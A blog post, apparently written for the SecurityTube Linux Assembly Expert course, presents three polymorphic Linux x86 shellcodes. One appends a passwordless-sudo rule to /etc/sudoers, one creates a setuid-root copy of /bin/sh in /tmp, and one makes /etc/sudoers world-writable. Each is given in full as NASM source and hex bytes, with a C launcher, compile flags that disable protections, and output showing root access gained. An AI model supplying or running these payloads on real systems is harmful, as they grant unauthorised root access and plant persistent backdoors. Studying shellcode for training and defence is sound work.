---
layout: post
title: Linux x86 Polymorphic Shellcode
tags: [slae]
---

The next assignment for the SLAE is taking existing shellcode from shell-storm or exploit-db and making polymorphic versions for three of them. 

## edit /etc/sudoers with ALL ALL=(ALL) NOPASSWD: ALL

The first shellcode I decided to tackle polymorphism on is shellcode for adding `ALL ALL=(ALL) NOPASSWD: ALL` to /etc/sudoers. Original shellcode can be found here: 

<http://shell-storm.org/shellcode/files/shellcode-62.php>

To better understand the shellcode I decided to put it through a debugger and to my surprise the shellcode actually doesn't work at all. This is because the original shellcode doesn't clear out registers in preparation of the syscalls. 

In GDB below after the MOV dl, 0x1c instruction is called:

```
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x3 
ECX: 0xbffff5fc ("ALL ALL=(ALL) NOPASSWD: ALL\n")
EDX: 0xb7fbf81c --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff658 --> 0x0 
ESP: 0xbffff5fc ("ALL ALL=(ALL) NOPASSWD: ALL\n")
EIP: 0x804a088 --> 0x80cd04b0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a07f <code+63>:	push   0x204c4c41
   0x804a084 <code+68>:	mov    ecx,esp
   0x804a086 <code+70>:	mov    dl,0x1c
=> 0x804a088 <code+72>:	mov    al,0x4
   0x804a08a <code+74>:	int    0x80
   0x804a08c <code+76>:	mov    al,0x6
   0x804a08e <code+78>:	int    0x80
   0x804a090 <code+80>:	xor    ebx,ebx
```

You can see that EDX contains more than just 0x1c which causes the write() to fail. 

The exit call suffers the same issue after doing a MOV al, 0x1.

```
[----------------------------------registers-----------------------------------]
EAX: 0xffffff01 
EBX: 0x0 
ECX: 0xbffff5fc ("ALL ALL=(ALL) NOPASSWD: ALL\n")
EDX: 0xb7fbf81c --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff658 --> 0x0 
ESP: 0xbffff5fc ("ALL ALL=(ALL) NOPASSWD: ALL\n")
EIP: 0x804a094 --> 0x80cd
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a08e <code+78>:	int    0x80
   0x804a090 <code+80>:	xor    ebx,ebx
   0x804a092 <code+82>:	mov    al,0x1
=> 0x804a094 <code+84>:	int    0x80
   0x804a096 <code+86>:	add    BYTE PTR [eax],al
   0x804a098:	add    BYTE PTR [eax],al
   0x804a09a:	add    BYTE PTR [eax],al
   0x804a09c:	add    BYTE PTR [eax],al
```

We can see EAX is populated 0xffffff01 which results in a seg fault when the interrupt is ran.

So all in all, the shellcode is fairly useless. 

For the polymorphic and working version of the shellcode I've used the JMP CALL POP technique for getting the string to be written on the stack. The shellcode is also register independent, null free, and smaller than the original that didn't work (decreased from 86 bytes to 79 bytes). 

My shellcode has also been published to Exploit-DB here: <https://www.exploit-db.com/exploits/44507/>

```nasm
global _start

section .text

_start:

	xor edx, edx		; clear edx
	xor ecx, ecx		; clear ecx
	push edx		; terminating NULL
	push 0x7372656f 	; "sreo"
	push 0x6475732f		; "dus/"
	push 0x6374652f		; "cte/"
	mov ebx, esp		; point ebx to stack
	inc ecx			; ecx to 1
	mov ch, 0x4		; ecx to 401 O_WRONLY | O_APPEND
	push 0x5		; open()
	pop eax			
	int 0x80		; execute open
	xchg ebx, eax		; save fd in ebx
	
	jmp short setup

	
write:

	pop ecx			; pop "ALL ALL=(ALL) NOPASSWD: ALL"
	mov dl, 0x1c		; len 28
	push 0x4		; write()
	pop eax		
	int 0x80		; execute write

	push 0x1		; exit ()
	pop eax
	int 0x80
	
setup:
    call write
    db "ALL ALL=(ALL) NOPASSWD: ALL" , 0xa
```

Let's test by compiling and extracting the shellcode.

```
root@ubuntu:~/SLAE/assignments/6$ ./compile.sh editsudoers_jmp
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
root@ubuntu:~/SLAE/assignments/6# for i in $(objdump -d editsudoers_jmp |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\x31\xd2\x31\xc9\x52\x68\x6f\x65\x72\x73\x68\x2f\x73\x75\x64\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\x6a\x05\x58\xcd\x80\x93\xeb\x0d\x59\xb2\x1c\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xee\xff\xff\xff\x41\x4c\x4c\x20\x41\x4c\x4c\x3d\x28\x41\x4c\x4c\x29\x20\x4e\x4f\x50\x41\x53\x53\x57\x44\x3a\x20\x41\x4c\x4c\x0a
```

C wrapper:

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xd2\x31\xc9\x52\x68\x6f\x65\x72\x73\x68\x2f\x73\x75\x64\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\x6a\x05\x58\xcd\x80\x93\xeb\x0d\x59\xb2\x1c\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xee\xff\xff\xff\x41\x4c\x4c\x20\x41\x4c\x4c\x3d\x28\x41\x4c\x4c\x29\x20\x4e\x4f\x50\x41\x53\x53\x57\x44\x3a\x20\x41\x4c\x4c\x0a";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Compile without stack protection.

```
root@ubuntu:~/SLAE/assignments/6# gcc shellcode.c -o shellcode -fno-stack-protector -z execstack
```

And finally test. 

```
root@ubuntu:~/SLAE/assignments/6# ./shellcode
Shellcode Length:  79
root@ubuntu:~/SLAE/assignments/6# cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
ALL ALL=(ALL) NOPASSWD: ALL
```

We can see the file has been successfully appended, so we should be able to sudo now without a password. Let's test with our non-root user. 

```
absolomb@ubuntu:~$ sudo bash
root@ubuntu:~#
```

Perfect!

## cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh

The next shellcode on the menu is shellcode that copies /bin/sh into /tmp and sets the setuid bit on it.

Original shellcode here: <http://shell-storm.org/shellcode/files/shellcode-540.php>

I decided to start from scratch here and simplify things significantly in comparison to the original shellcode. Once again the JMP CALL POP technique was used,  but this time for getting the commmand to be ran onto the stack. Original shellcode for this one was 126 bytes, mine accomplishes the same thing at 74 bytes. 

My shellcode has also been published to Exploit-DB here: <https://www.exploit-db.com/exploits/44510/>

```nasm
global _start			

section .text
_start:

	push 0xb		; execve()		
	pop eax			;
	cdq    			; set edx to 0
	push edx		; NULL
	push word 0x632d	; "c-"	
	mov edi,esp		; point edi to stack
	push edx		; NULL
	push 0x68732f2f		; "hs//"
	push 0x6e69622f		; "/bin"
	mov ebx,esp		; point ebx to stack
	push edx		; NULL

	jmp short cmd

execute:

	push edi		; "c-"
	push ebx		; "/bin/sh"
	mov ecx,esp		; point to stack
	int 0x80		; execute execve


cmd:
	call execute
	db "cp /bin/sh /tmp/sh; chmod +s /tmp/sh"
```

Compile and test.

```
absolomb@ubuntu:~/SLAE/assignments/6$ ./compile.sh execve
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
absolomb@ubuntu:~/SLAE/assignments/6$ for i in $(objdump -d execve |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\xeb\x06\x57\x53\x89\xe1\xcd\x80\xe8\xf5\xff\xff\xff\x63\x70\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2f\x74\x6d\x70\x2f\x73\x68\x3b\x20\x63\x68\x6d\x6f\x64\x20\x2b\x73\x20\x2f\x74\x6d\x70\x2f\x73\x68
```

Place shellcode in a C wrapper (same as above) and compile with GCC.

```
absolomb@ubuntu:~/SLAE/assignments/6$ gcc setuid.c -o setuid -fno-stack-protector -z execstack
```

Now run to test.

```
absolomb@ubuntu:~/SLAE/assignments/6$ sudo ./setuid
Shellcode Length:  74
absolomb@ubuntu:~/SLAE/assignments/6$ ls -al /tmp
total 144
drwxrwxrwt  7 root     root       4096 Apr 20 10:08 .
drwxr-xr-x 22 root     root       4096 Mar 19 16:33 ..
-rw-------  1 absolomb absolomb      0 Apr 20 06:28 config-err-o7e65E
drwxrwxrwt  2 root     root       4096 Apr 20 06:28 .ICE-unix
-rwsr-sr-x  1 root     absolomb 112204 Apr 20 10:09 sh
-rw-rw-r--  1 absolomb absolomb      0 Apr 20 06:28 unity_support_test.0
drwx------  2 absolomb absolomb   4096 Apr 20 06:28 vmware-absolomb
drwxrwxrwt  2 root     root       4096 Apr 20 06:28 VMwareDnD
drwx------  2 root     root       4096 Apr 20 06:57 vmware-root
-r--r--r--  1 root     root         11 Apr 20 06:28 .X0-lock
drwxrwxrwt  2 root     root       4096 Apr 20 06:28 .X11-unix
```
Our shell is indeed in /tmp with a root setuid.

```
absolomb@ubuntu:~/SLAE/assignments/6$ id
uid=1000(absolomb) gid=1000(absolomb) groups=1000(absolomb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
absolomb@ubuntu:~/SLAE/assignments/6$ /tmp/sh
# id
uid=1000(absolomb) gid=1000(absolomb) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),1000(absolomb)
```

Success!

## chmod 777 /etc/sudoers

For the last shellcode I decided to tackle something a little smaller and just made minor tweaks to the existing shellcode found here: 

<https://www.exploit-db.com/exploits/43463/>

The original shellcode was at 36 bytes and I reduced it down to 33 bytes by removing XOR instructions and replacing with CDQ and by PUSH and POPs to accomplish the same thing.

```
global _start
 
section .text
 
_start:
 
    cdq			; edx to 0
    push edx		; terminating NULL
    push 0x7372656f	; 'sreo'
    push 0x6475732f	; 'dus/'
    push 0x6374652f	; 'cte/'
    mov ebx, esp	; point ebx to stack
    mov cx, 0x1ff	; 777
    push 0xf		; chmod()
    pop eax		
    int 0x80		; execute chmod()
    push 0x1		; exit()
    pop eax
    int 0x80		; execute exit()
```

Let's compile and test (you know the drill by now).

```
absolomb@ubuntu:~/SLAE/assignments/6$ ./compile.sh chmod
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
absolomb@ubuntu:~/SLAE/assignments/6$ for i in $(objdump -d chmod |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\x99\x52\x68\x6f\x65\x72\x73\x68\x2f\x73\x75\x64\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\xff\x01\x6a\x0f\x58\xcd\x80\x6a\x01\x58\xcd\x80
absolomb@ubuntu:~/SLAE/assignments/6$ vim shellcode.c
absolomb@ubuntu:~/SLAE/assignments/6$ gcc shellcode.c -o shellcode -fno-stack-protector -z execstack
absolomb@ubuntu:~/SLAE/assignments/6$ sudo ./shellcode
Shellcode Length:  33
absolomb@ubuntu:~/SLAE/assignments/6$ ls -al /etc/sudoers
-rwxrwxrwx 1 root root 745 Feb 10  2014 /etc/sudoers
```

All done!

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1208

Github Repo: <https://github.com/absolomb/SLAE>